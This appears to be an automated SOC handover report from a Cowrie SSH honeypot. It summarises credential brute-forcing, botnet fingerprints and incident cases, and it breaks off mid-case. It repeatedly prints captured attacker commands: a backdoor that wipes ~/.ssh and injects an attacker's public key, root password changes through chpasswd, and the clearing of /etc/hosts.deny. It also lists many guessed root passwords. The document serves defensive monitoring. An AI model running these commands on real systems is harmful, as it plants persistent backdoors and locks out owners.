# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-10 |
| **Generated At** | 2026-06-10T10:09:27Z |
| **Shift Time** | 10:09 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **1052** |
| Confirmed Threats | **981** |
| False Positives Filtered | **71** (6.8%) |
| Unique Attacker IPs | **88** |
| Countries of Origin | **23** |
| High Severity Cases | **173** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **879** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **487** |
| Unique Credential Pairs | **318** |
| Unique Usernames | **182** |
| Unique Passwords | **256** |
| Successful Auth Pairs | **114** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 174 |
| `345gs5662d34` | 81 |
| `ubuntu` | 12 |
| `admin` | 12 |
| `frappe` | 4 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 81 |
| `3245gs5662d34` | 79 |
| `123456` | 21 |
| `123` | 10 |
| `1234` | 8 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 81 |
| `root` | `3245gs5662d34` | 79 |
| `hacker` | `hacker` | 2 |
| `user1` | `12` | 2 |
| `calix` | `calix` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Changeme1` | `103.154.77.48` | 2026-06-10T04:02:11 |
| `root` | `3245gs5662d34` | `103.154.77.48` | 2026-06-10T04:02:14 |
| `root` | `qwe123!!` | `106.13.142.171` | 2026-06-10T04:02:34 |
| `root` | `Abc654321` | `31.56.178.132` | 2026-06-10T04:03:19 |
| `root` | `3245gs5662d34` | `31.56.178.132` | 2026-06-10T04:03:28 |
| `root` | `Qq123123!` | `103.154.77.48` | 2026-06-10T04:04:07 |
| `root` | `qwe123!@` | `24.199.122.229` | 2026-06-10T04:07:38 |
| `root` | `qwe123-=` | `103.154.77.48` | 2026-06-10T04:07:58 |
| `root` | `abcd@1234` | `24.199.122.229` | 2026-06-10T04:08:05 |
| `root` | `test@123` | `24.199.122.229` | 2026-06-10T04:08:08 |
| `root` | `Xy123456.` | `103.154.77.48` | 2026-06-10T04:09:56 |
| `root` | `Bx123456.` | `103.154.77.48` | 2026-06-10T04:13:44 |
| `root` | `0147` | `76.79.213.69` | 2026-06-10T04:17:18 |
| `root` | `3245gs5662d34` | `76.79.213.69` | 2026-06-10T04:17:25 |
| `root` | `1QA2WS3ED` | `103.154.77.48` | 2026-06-10T04:17:33 |
| `root` | `key` | `103.154.77.48` | 2026-06-10T04:19:27 |
| `root` | `9ijn(IJN` | `103.154.77.48` | 2026-06-10T04:22:15 |
| `root` | `Qwerty12345` | `31.56.178.132` | 2026-06-10T04:33:49 |
| `root` | `passw0rd!` | `31.56.178.132` | 2026-06-10T04:37:46 |
| `root` | `Passw0rd!123` | `31.56.178.132` | 2026-06-10T04:42:21 |
| `root` | `Zxcvbnm123456` | `14.103.118.189` | 2026-06-10T04:46:12 |
| `root` | `hc123456!` | `31.56.178.132` | 2026-06-10T04:46:16 |
| `root` | `Server2024!` | `4.182.219.135` | 2026-06-10T04:46:23 |
| `root` | `3245gs5662d34` | `4.182.219.135` | 2026-06-10T04:46:27 |
| `root` | `!QAZ2wsx3edc$RFV` | `106.13.100.52` | 2026-06-10T04:47:34 |
| `root` | `admin` | `64.89.162.149` | 2026-06-10T04:48:07 |
| `root` | `Abc@2026` | `4.182.219.135` | 2026-06-10T04:48:33 |
| `root` | `test12345678` | `31.56.178.132` | 2026-06-10T04:49:48 |
| `root` | `rahul@123` | `14.103.118.189` | 2026-06-10T04:56:18 |
| `root` | `QWERqwer1234` | `4.182.219.135` | 2026-06-10T04:57:06 |
| `root` | `password8888` | `4.182.219.135` | 2026-06-10T04:59:12 |
| `root` | `toto` | `14.103.118.189` | 2026-06-10T05:06:37 |
| `root` | `Asdf2024` | `4.182.219.135` | 2026-06-10T05:16:24 |
| `root` | `rafael` | `4.182.219.135` | 2026-06-10T05:35:42 |
| `root` | `Qwerty11` | `4.182.219.135` | 2026-06-10T05:37:52 |
| `root` | `zxcvbnm` | `200.58.83.79` | 2026-06-10T05:38:42 |
| `root` | `zxcvbnm` | `60.174.35.18` | 2026-06-10T05:38:53 |
| `root` | `qazwsx123...` | `4.182.219.135` | 2026-06-10T05:40:07 |
| `root` | `!p@ssw0rd` | `188.215.31.4` | 2026-06-10T05:43:47 |
| `root` | `3245gs5662d34` | `188.215.31.4` | 2026-06-10T05:43:51 |
| `root` | `andy` | `188.215.31.4` | 2026-06-10T05:48:39 |
| `root` | `Qwerty11` | `114.130.85.36` | 2026-06-10T05:50:30 |
| `root` | `3245gs5662d34` | `114.130.85.36` | 2026-06-10T05:50:33 |
| `root` | `asd123` | `101.47.155.9` | 2026-06-10T05:54:24 |
| `root` | `3245gs5662d34` | `101.47.155.9` | 2026-06-10T05:54:26 |
| `root` | `root@1234` | `188.215.31.4` | 2026-06-10T05:55:30 |
| `root` | `112233445566` | `182.44.116.87` | 2026-06-10T05:56:03 |
| `root` | `3245gs5662d34` | `182.44.116.87` | 2026-06-10T05:56:06 |
| `root` | `121212` | `101.47.155.9` | 2026-06-10T05:56:21 |
| `root` | `Qq123123` | `101.47.155.9` | 2026-06-10T06:00:21 |
| `root` | `123QAZwsx` | `101.47.155.9` | 2026-06-10T06:04:01 |
| `root` | `abc2024` | `182.44.116.87` | 2026-06-10T06:05:33 |
| `root` | `Mypassword@123` | `101.47.155.9` | 2026-06-10T06:06:01 |
| `root` | `228228` | `188.215.31.4` | 2026-06-10T06:06:48 |
| `root` | `12345678900` | `188.215.31.4` | 2026-06-10T06:13:28 |
| `root` | `qweqwe123123` | `101.47.155.9` | 2026-06-10T06:13:40 |
| `root` | `!@#QWEasdzxc` | `188.215.31.4` | 2026-06-10T06:19:16 |
| `root` | `eSER!@#` | `101.47.155.9` | 2026-06-10T06:21:19 |
| `root` | `qwerty123!@#` | `188.215.31.4` | 2026-06-10T06:22:01 |
| `root` | `A1234567a` | `188.215.31.4` | 2026-06-10T06:23:48 |
| `root` | `Qweasd123.` | `101.47.155.9` | 2026-06-10T06:28:56 |
| `root` | `toor` | `158.173.154.114` | 2026-06-10T06:40:06 |
| `root` | `Amazonaws@2026` | `176.125.241.9` | 2026-06-10T07:36:09 |
| `root` | `Wy@123456` | `103.154.158.70` | 2026-06-10T08:02:52 |
| `root` | `3245gs5662d34` | `103.154.158.70` | 2026-06-10T08:02:54 |
| `root` | `Password01!` | `103.154.158.70` | 2026-06-10T08:07:28 |
| `root` | `Amazonaws@2026` | `81.177.212.209` | 2026-06-10T08:10:16 |
| `root` | `mohammad123` | `13.71.92.229` | 2026-06-10T08:12:38 |
| `root` | `3245gs5662d34` | `13.71.92.229` | 2026-06-10T08:12:40 |
| `root` | `3edc#EDC3edc` | `58.229.253.119` | 2026-06-10T08:13:11 |
| `root` | `3245gs5662d34` | `58.229.253.119` | 2026-06-10T08:13:15 |
| `root` | `123qwe.` | `157.245.1.7` | 2026-06-10T08:24:37 |
| `root` | `3245gs5662d34` | `157.245.1.7` | 2026-06-10T08:24:42 |
| `root` | `Letmein!` | `204.168.240.142` | 2026-06-10T08:26:59 |
| `root` | `3245gs5662d34` | `204.168.240.142` | 2026-06-10T08:27:03 |
| `root` | `root!123` | `157.245.1.7` | 2026-06-10T08:27:51 |
| `root` | `ZAQ123wsx` | `204.168.240.142` | 2026-06-10T08:28:40 |
| `root` | `Pass123$` | `157.245.1.7` | 2026-06-10T08:30:59 |
| `root` | `diego` | `157.245.1.7` | 2026-06-10T08:34:18 |
| `root` | `123456789A` | `204.168.240.142` | 2026-06-10T08:35:27 |
| `root` | `9999` | `157.245.1.7` | 2026-06-10T08:37:35 |
| `root` | `@qwer2025` | `157.245.1.7` | 2026-06-10T08:39:13 |
| `root` | `Admin%123` | `5.182.83.231` | 2026-06-10T08:40:17 |
| `root` | `3245gs5662d34` | `5.182.83.231` | 2026-06-10T08:40:22 |
| `root` | `test` | `14.103.114.172` | 2026-06-10T08:43:11 |
| `root` | `3245gs5662d34` | `14.103.114.172` | 2026-06-10T08:43:14 |
| `root` | `Admin@741852` | `108.167.177.224` | 2026-06-10T08:46:06 |
| `root` | `3245gs5662d34` | `108.167.177.224` | 2026-06-10T08:46:12 |
| `root` | `Cloud@2024` | `204.168.240.142` | 2026-06-10T08:50:41 |
| `root` | `fa` | `5.182.83.231` | 2026-06-10T08:50:50 |
| `root` | `xxXX1234` | `41.82.50.218` | 2026-06-10T08:51:51 |
| `root` | `3245gs5662d34` | `41.82.50.218` | 2026-06-10T08:51:56 |
| `root` | `Huawei@5tgb` | `204.168.240.142` | 2026-06-10T08:52:25 |
| `root` | `Qwertyuiop123@` | `204.168.240.142` | 2026-06-10T08:54:07 |
| `root` | `zxcvbnm@123` | `45.33.93.17` | 2026-06-10T08:55:14 |
| `root` | `3245gs5662d34` | `45.33.93.17` | 2026-06-10T08:55:20 |
| `root` | `ready2go` | `45.33.93.17` | 2026-06-10T08:57:08 |
| `root` | `A123456` | `204.168.240.142` | 2026-06-10T08:57:37 |
| `root` | `1234QWERqwer` | `204.168.240.142` | 2026-06-10T08:59:19 |
| `root` | `Yb123456` | `204.168.240.142` | 2026-06-10T09:09:32 |
| `root` | `aaa` | `204.168.240.142` | 2026-06-10T09:12:59 |
| `root` | `vps@2024` | `45.33.93.17` | 2026-06-10T09:13:16 |
| `root` | `Cb123456@` | `45.33.93.17` | 2026-06-10T09:18:36 |
| `root` | `585858` | `45.33.93.17` | 2026-06-10T09:20:26 |
| `root` | `abc123456.` | `45.33.93.17` | 2026-06-10T09:24:06 |
| `root` | `Asdfghjkl;'` | `45.33.93.17` | 2026-06-10T09:29:41 |
| `root` | `qwe123qwe` | `45.33.93.17` | 2026-06-10T09:31:27 |
| `root` | `admin123#` | `196.189.237.172` | 2026-06-10T09:57:21 |
| `root` | `3245gs5662d34` | `196.189.237.172` | 2026-06-10T09:57:26 |
| `root` | `123q123q` | `196.189.237.172` | 2026-06-10T10:01:20 |
| `root` | `P@ssw0rd10` | `119.203.251.187` | 2026-06-10T10:02:12 |
| `root` | `3245gs5662d34` | `119.203.251.187` | 2026-06-10T10:02:16 |
| `root` | `Asd123!!` | `196.189.237.172` | 2026-06-10T10:03:24 |
| `root` | `Aa123456!@#` | `171.220.244.134` | 2026-06-10T10:03:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **1052** |
| Sessions with Fingerprint | **9** |
| Unique HASSH Fingerprints | **9** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 487 |
| Go SSH scanner | 27 |
| OpenSSH | 7 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 396 | 23 |
| `03a80b21afa8...` | Modern SSH client | 77 | 12 |
| `0a07365cc01f...` | Generic scanner | 23 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 5 | 5 |
| `e54ef3ec27fe...` | Generic scanner | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 396 | 23 | Mirai/variant |
| `03a80b21afa8...` | libssh | 77 | 12 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 23 | 1 | Generic scanner |
| `95420f9d932d...` | libssh | 14 | 6 | — |
| `acaa53e0a7d7...` | OpenSSH | 5 | 5 | Mirai/variant |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `472b5de333ad...` | OpenSSH | 2 | 2 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1082, T1592` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 79 | 20 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ZMI5RTN5PQTL"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `106.13.100.52`, `171.220.244.134`, `14.103.118.189`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:CiRr0gjHaG3E"|chpasswd|bash
```
Source IPs: `106.13.142.171`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `5.182.83.231`, `31.56.178.132`, `196.189.237.172`, `188.215.31.4`, `103.154.77.48`, `182.44.116.87`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **88** |
| Unique ASNs | **47** |
| High-Risk ASNs | **39** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 8 | HIGH |
| `AS14061` | DigitalOcean, LLC | 7 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 6 | HIGH |
| `AS16509` | Amazon.com, Inc. | 5 | HIGH |
| `AS8075` | Microsoft Corporation | 5 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (171)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-1cd5ed8f4bec

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:02 |
| **Last Seen** | 2026-06-10 04:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:02:11` | `cowrie.session.connect` |
| `2026-06-10 04:02:11` | `cowrie.client.version` |
| `2026-06-10 04:02:11` | `cowrie.client.kex` |
| `2026-06-10 04:02:11` | `cowrie.login.success` |
| `2026-06-10 04:02:11` | `cowrie.session.params` |
| `2026-06-10 04:02:11` | `cowrie.command.input` |
| `2026-06-10 04:02:11` | `cowrie.command.failed` |
| `2026-06-10 04:02:11` | `cowrie.log.closed` |
| `2026-06-10 04:02:12` | `cowrie.session.params` |
| `2026-06-10 04:02:12` | `cowrie.command.input` |
| `2026-06-10 04:02:12` | `cowrie.session.file_download` |
| `2026-06-10 04:02:12` | `cowrie.log.closed` |
| `2026-06-10 04:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1262236308fc

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:02 |
| **Last Seen** | 2026-06-10 04:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:02:13` | `cowrie.session.connect` |
| `2026-06-10 04:02:13` | `cowrie.client.version` |
| `2026-06-10 04:02:13` | `cowrie.client.kex` |
| `2026-06-10 04:02:14` | `cowrie.login.success` |
| `2026-06-10 04:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.154.77[.]48` to AbuseIPDB if not already reported
- [ ] Block `103.154.77[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9018c237067

| Field | Detail |
|---|---|
| **Source IP** | `106.13.142[.]171` |
| **First Seen** | 2026-06-10 04:02 |
| **Last Seen** | 2026-06-10 04:06 |
| **Session Duration** | 244s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:CiRr0gjHaG3E"|chpasswd|bash` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:02:29` | `cowrie.session.connect` |
| `2026-06-10 04:02:29` | `cowrie.client.version` |
| `2026-06-10 04:02:31` | `cowrie.client.kex` |
| `2026-06-10 04:02:34` | `cowrie.login.success` |
| `2026-06-10 04:02:35` | `cowrie.session.params` |
| `2026-06-10 04:02:35` | `cowrie.command.input` |
| `2026-06-10 04:02:35` | `cowrie.command.failed` |
| `2026-06-10 04:02:36` | `cowrie.log.closed` |
| `2026-06-10 04:02:36` | `cowrie.session.params` |
| `2026-06-10 04:02:36` | `cowrie.command.input` |
| `2026-06-10 04:02:37` | `cowrie.session.file_download` |
| `2026-06-10 04:02:37` | `cowrie.log.closed` |
| `2026-06-10 04:02:48` | `cowrie.session.params` |
| `2026-06-10 04:02:48` | `cowrie.command.input` |
| `2026-06-10 04:02:48` | `cowrie.log.closed` |
| `2026-06-10 04:02:49` | `cowrie.session.params` |
| `2026-06-10 04:02:49` | `cowrie.command.input` |
| `2026-06-10 04:06:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.142[.]171` to AbuseIPDB if not already reported
- [ ] Block `106.13.142[.]171` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c47fa6beba4

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:03 |
| **Last Seen** | 2026-06-10 04:03 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:03:06` | `cowrie.session.connect` |
| `2026-06-10 04:03:08` | `cowrie.client.version` |
| `2026-06-10 04:03:08` | `cowrie.client.kex` |
| `2026-06-10 04:03:19` | `cowrie.login.success` |
| `2026-06-10 04:03:20` | `cowrie.session.params` |
| `2026-06-10 04:03:20` | `cowrie.command.input` |
| `2026-06-10 04:03:20` | `cowrie.command.failed` |
| `2026-06-10 04:03:20` | `cowrie.log.closed` |
| `2026-06-10 04:03:21` | `cowrie.session.params` |
| `2026-06-10 04:03:21` | `cowrie.command.input` |
| `2026-06-10 04:03:21` | `cowrie.session.file_download` |
| `2026-06-10 04:03:21` | `cowrie.log.closed` |
| `2026-06-10 04:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8363dc49741

| Field | Detail |
|---|---|
| **Source IP** | `31.56.178[.]132` |
| **First Seen** | 2026-06-10 04:03 |
| **Last Seen** | 2026-06-10 04:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:03:26` | `cowrie.session.connect` |
| `2026-06-10 04:03:26` | `cowrie.client.version` |
| `2026-06-10 04:03:27` | `cowrie.client.kex` |
| `2026-06-10 04:03:28` | `cowrie.login.success` |
| `2026-06-10 04:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.56.178[.]132` to AbuseIPDB if not already reported
- [ ] Block `31.56.178[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3775ffa7a1c

| Field | Detail |
|---|---|
| **Source IP** | `103.154.77[.]48` |
| **First Seen** | 2026-06-10 04:04 |
| **Last Seen** | 2026-06-10 04:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-10 04:04:06` | `cowrie.session.connect` |
| `2026-06-10 04:04:06` | `cowrie.client.version` |
| `2026-06-10 04:04:06` | `cowrie.client.kex` |
| `2026-06-10 04:04:07` | `cowrie.login.success` |
| `2026-06-10 04:04:07` | `cowrie.session.params` |
| `2026-06-10 04:04:07` | `cowrie.command.input` |
| `2026-06-10 04:04:07` | `cowrie.command.failed` |
| `2026-06-10 04:04:07` | `cowrie.log.closed` |
| `2026-06-10 04:04:07` | `cowrie.session.params` |
| `2026-06-10 04:04:07` | `cowrie.command.input` |
| `2026-06-10 04:04:07` | `cowrie.session.file_download` |
